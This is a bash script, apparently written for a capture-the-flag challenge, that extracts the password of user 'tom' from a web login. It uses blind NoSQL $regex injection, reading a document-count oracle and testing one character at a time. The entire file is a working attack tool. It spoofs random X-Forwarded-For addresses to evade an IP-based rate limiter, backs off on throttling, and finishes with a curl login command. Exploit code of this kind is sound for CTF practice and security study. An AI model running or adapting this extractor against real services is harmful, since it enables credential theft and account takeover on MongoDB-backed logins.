#!/usr/bin/env bash
#
# NoSQL ($regex) password extractor for the "tom" CTF.  [v4 — document-count oracle]
#
# Oracle: the page prints "Database Documents : N".
#   N>=1  => the query  {username:"tom", password:{$regex:"^<prefix>"}}  matched tom
#   N=0   => no match
# We walk the password one char at a time using that count. $regex is NOT on the
# app's operator blacklist (unlike $eq/$ne), so this path is allowed.
#
# Endgame: after extracting the password, do ONE plaintext login (no operators):
#   username=tom & password=<extracted>
#
# Usage:
#   ROTATE_XFF=1 DELAY=0.1 ./extract_tom.sh          # recommended (IP-based limiter bypass)
#   ./extract_tom.sh "Pa"                            # resume from a known prefix
#   SUCCESS_MARKER="Documents : 1" ./extract_tom.sh  # force a literal marker instead of the oracle
#
set -uo pipefail

BASE="https://0becfa19d485ac808817f9ab617c2061-toms-login.web.cityinthe.cloud"
LOGIN_PATH="/login"
USER="tom"

# alnum first (common), then symbols. Expand if a position comes up empty.
CHARSET='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.!#$%*+?=&'

KNOWN="${1:-}"
DELAY="${DELAY:-0.1}"
MAXLEN="${MAXLEN:-48}"
ROTATE_XFF="${ROTATE_XFF:-0}"
SUCCESS_MARKER="${SUCCESS_MARKER:-}"
TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT

echo "### extract_tom.sh v4 (doc-count oracle) ###"

re_escape() {
  case "$1" in
    '.'|'*'|'+'|'?'|'('|')'|'['|']'|'{'|'}'|'^'|'$'|'|'|'\') printf '\\%s' "$1" ;;
    *) printf '%s' "$1" ;;
  esac
}
build_regex() {
  local s="$1" out='^' i
  for (( i=0; i<${#s}; i++ )); do out+="$(re_escape "${s:$i:1}")"; done
  printf '%s%s' "$out" "${2:-}"
}

request() {   # $1 = raw regex value -> echoes http_code; writes body
  local regex="$1" hdr=()
  [ "$ROTATE_XFF" = "1" ] && hdr=(-H "X-Forwarded-For: $((RANDOM%223+1)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))")
  curl -sS -G "${BASE}${LOGIN_PATH}" \
    "${hdr[@]}" \
    --data-urlencode "username=${USER}" \
    --data-urlencode "password[\$regex]=${regex}" \
    -o "$TMP/body" -w '%{http_code}' 2>/dev/null
}
probe() {     # $1 = raw regex value -> echoes http_code (429 + 5xx retry)
  local code tries=0
  while :; do
    code="$(request "$1")"
    case "$code" in
      429)          echo "  [429] rate limited, backing off 10s..." >&2; sleep 10; continue ;;
      502|503|504)  tries=$((tries+1)); if [ "$tries" -le 3 ]; then echo "  [$code] gateway hiccup, retry ${tries}/3..." >&2; sleep 2; continue; fi ;;
    esac
    sleep "$DELAY"; printf '%s' "$code"; return
  done
}

# pull the integer from "Database Documents : N" (whitespace-tolerant). file arg optional.
doc_count() {
  local f="${1:-$TMP/body}"
  grep -oiE 'Documents[[:space:]]*:[[:space:]]*[0-9]+' "$f" 2>/dev/null \
    | grep -oE '[0-9]+' | tail -n1
}

# ============================= CALIBRATE =============================
echo "[*] Target: ${BASE}${LOGIN_PATH} (user=${USER})  delay=${DELAY}s  xff=${ROTATE_XFF}"
echo "[*] Calibrating oracle against ^zzNOMATCH\$ (expect 0) and .* (expect >=1)..."

probe "$(build_regex 'zzNOMATCH__ctf' '$')" >/dev/null
F_DOCS="$(doc_count)"; cp "$TMP/body" "$TMP/false_body"
probe '.*' >/dev/null
T_DOCS="$(doc_count)"

echo "    FALSE (^zzNOMATCH\$) -> Documents = '${F_DOCS:-<none>}'"
echo "    TRUE  (.*)          -> Documents = '${T_DOCS:-<none>}'"

DISC="none"
if [ -n "$SUCCESS_MARKER" ]; then
  DISC="marker"
elif [ "${T_DOCS:-}" = "1" ] && [ "${F_DOCS:-}" = "0" ]; then
  DISC="oracle"
elif [ -n "${T_DOCS:-}" ] && [ -n "${F_DOCS:-}" ] && [ "${T_DOCS}" -ge 1 ] 2>/dev/null && [ "${F_DOCS}" -eq 0 ] 2>/dev/null; then
  DISC="oracle"
elif ! cmp -s "$TMP/body" "$TMP/false_body"; then
  DISC="bodydiff"
fi

echo "[*] Discriminator: ${DISC}"
if [ "$DISC" = "none" ]; then
  echo "[!] Oracle not found. '.*' and '^zzNOMATCH\$' gave the same thing, so the injection"
  echo "    may not be firing. Saved true_body.html / false_body.html for inspection."
  cp "$TMP/body" ./true_body.html; cp "$TMP/false_body" ./false_body.html
  exit 2
fi
echo

is_success() {   # body already on disk
  case "$DISC" in
    oracle)   local n; n="$(doc_count)"; [ -n "$n" ] && [ "$n" -ge 1 ] 2>/dev/null ;;
    marker)   grep -qiF -- "$SUCCESS_MARKER" "$TMP/body" ;;
    bodydiff) ! cmp -s "$TMP/body" "$TMP/false_body" ;;
    *) return 1 ;;
  esac
}

# ============================= EXTRACT ==============================
pw="$KNOWN"
for (( pos=${#KNOWN}; pos<MAXLEN; pos++ )); do

  # current string the complete password?  (^pw$ matches exactly)
  if [ -n "$pw" ]; then
    probe "$(build_regex "$pw" '$')" >/dev/null
    if is_success; then
      echo; echo "[+] Exact match on '^${pw}\$'"
      echo "[+] PASSWORD = ${pw}"
      echo
      echo "[>] Final step — plaintext login (no operators):"
      echo "    curl -s -G '${BASE}${LOGIN_PATH}' --data-urlencode 'username=tom' --data-urlencode 'password=${pw}'"
      exit 0
    fi
  fi

  echo "[*] Position $((pos+1)) — prefix: '${pw}'"
  found=""
  for (( i=0; i<${#CHARSET}; i++ )); do
    c="${CHARSET:$i:1}"
    probe "$(build_regex "${pw}${c}")" >/dev/null
    if is_success; then
      echo "    [HIT] '${c}'  -> '${pw}${c}'"; pw="${pw}${c}"; found=1; break
    fi
  done

  if [ -z "$found" ]; then
    echo; echo "[!] Nothing matched at position $((pos+1)). Password so far: '${pw}'"
    echo "    Either it's complete (the exact-match check would have caught it — re-run to confirm),"
    echo "    or the next char isn't in CHARSET. Add it and resume:  ./extract_tom.sh '${pw}'"
    exit 1
  fi
done
echo; echo "[=] Hit MAXLEN. So far: '${pw}'"
